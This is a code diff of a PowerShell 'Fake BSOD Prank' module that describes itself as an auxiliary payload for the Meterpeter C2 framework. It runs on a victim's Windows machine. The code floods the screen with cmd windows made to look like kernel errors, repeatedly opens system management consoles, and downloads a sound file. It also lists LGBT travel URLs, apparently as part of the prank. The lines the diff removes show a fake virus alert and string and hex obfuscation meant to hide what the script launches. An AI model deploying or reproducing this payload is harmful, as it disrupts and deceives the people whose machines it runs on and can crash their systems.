@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19043) x64 bits
    Required Dependencies: IWR, Media.SoundPlayer {native}
    Optional Dependencies: Critical.wav {auto-download}
-   PS cmdlet Dev version: v1.2.13
+   PS cmdlet Dev version: v1.2.14
 
 .DESCRIPTION
    Auxiliary module of Meterpeter C2 v2.10.14 that executes a prank in background.
@@ -72,13 +72,13 @@
 ## Global variable declarations
 $ErrorActionPreference = "SilentlyContinue"
 [int]$FinalSfx = $MaxInteractions -1 ## Set the last interaction!
-write-host "* Powershell Fake BS`OD Prank" -ForegroundColor Green
+write-host "* Powershell Fake [B]SOD Prank" -ForegroundColor Green
 $LasLink = "https://www.travelgay.pt/destination/gay-portugal/gay-lisbon"
 $UrlLink = "https://www.travelgay.com/destination/gay-portugal/gay-lisbon"
 $UriLink = "https://theculturetrip.com/europe/portugal/lisbon/articles/the-top-10-lgbt-clubs-and-bars-in-lisbon"
 
 
-#Download sound sfx files from my github repository
+## Download sound sfx files from my github repository
 If($WaveFile -ieq "Critical.wav" -or $WaveFile -iNotMatch '(.wav)$')
 {
    If($WaveFile -iNotMatch '(.wav)$')
@@ -103,7 +103,7 @@ If($PreventBSOD -ieq "true")
       $DelayTime = "10"
       [int]$MaxInteractions = 100
       write-host "x" -ForegroundColor Red -NoNewline
-      write-host " Error: current -maxinteractions parameter will cause BS`OD .." -ForegroundColor DarkGray
+      write-host " Error: current -maxinteractions parameter will cause [B]SOD .." -ForegroundColor DarkGray
       write-host "  => Defaulting -maxinteractions arg to '$MaxInteractions' interactions .." -ForegroundColor DarkYellow
    }
 }
@@ -144,53 +144,23 @@ For($i=1; $i -lt $MaxInteractions; $i++)
    #Spawn cmd terminal console and make it look like one kernel error as ocurr
    Start-Process cmd.exe -argumentlist "/R color 90&title $MsgBoxTitle&echo $MsgBoxText&Pause"
 
-
-   ## Check Operative system version [BallonTip]
-   If(([System.Environment]::OSVersion.Version.Major) -match '^(7|8|8.1|10)$')
-   {
-      <#
-      .SYNOPSIS
-         Author: @r00t-3xp10it
-         Helper - Display a ballontip in notification area
-      #>
-
-      Add-Type -AssemblyName System.Windows.Forms
-      $GlobalShit = "£N@e£w-O@bj£ec@t S@y£st£e@m.W@in£do@w£s.F£o@rm@s.N@ot£i@fyI@co@n£" -replace '(@|£)',''
-      $global:balmsg = $GlobalShit|&('XeX' -replace '^(X)','i')
-      $path = (Get-Process -id $pid).Path
-
-      ## Build ballon box
-      $balmsg.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
-      $balmsg.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Warning
-      $balmsg.BalloonTipText = "A virus has detected in $Env:COMPUTERNAME"
-      $balmsg.BalloonTipTitle = "Attention $Env:USERNAME"
-      $balmsg.Visible = $true
-      $balmsg.ShowBalloonTip(20000)
-   }
-
    Start-Sleep -Seconds 1
    Start $Env:PROGRAMFILES
 
    If($i -Match '^(3|7|12|13|15|16|18|20|23|27|30|32|33|40|50|60|70|80|90|97|98|99|100)$')
    {
-      $HexProcessName = $null
-      ## Open drive manager [HEX obfuscated]
-      $DeObfuscate = '64 69 73 6B 6D 67 6D 74 2E 6D 73 63'.Split(" ")|ForEach{[char]([convert]::toint16($_,16))}|ForEach{$HexProcessName=$HexProcessName+$_}
-      Start-Process $HexProcessName
+      ## Open drive manager
+      Start-Process diskmgmt.msc
    }
    ElseIf($i -Match '^(5|9|14|17|18|19|20|21|25|29|30|40|50|60|70|80|90|97|98|99|100)$')
    {
-      $HexProcessName = $null
-      #Open firewall manager [HEX obfuscated]
-      $DeObfuscate = '66 69 72 65 77 61 6C 6C 2E 63 70 6C'.Split(" ")|ForEach{[char]([convert]::toint16($_,16))}|ForEach{$HexProcessName=$HexProcessName+$_}
-      Start-Process $HexProcessName
+      #Open firewall manager
+      Start-Process firewall.cpl
    }
    ElseIf($i -Match '^(6|8|9|11|13|15|17|19|20|22|23|24|30|40|50|60|70|80|90|97|98|99|100)$')
    {
-      $HexProcessName = $null
-      #Open programs manager [HEX obfuscated]
-      $DeObfuscate = '61 70 70 77 69 7A 2E 63 70 6C'.Split(" ")|ForEach{[char]([convert]::toint16($_,16))}|ForEach{$HexProcessName=$HexProcessName+$_}
-      Start-Process $HexProcessName 
+      #Open programs manager
+      Start-Process appwiz.cpl 
    }
    ElseIf($i -Match "^($FinalSfx)$")
    {
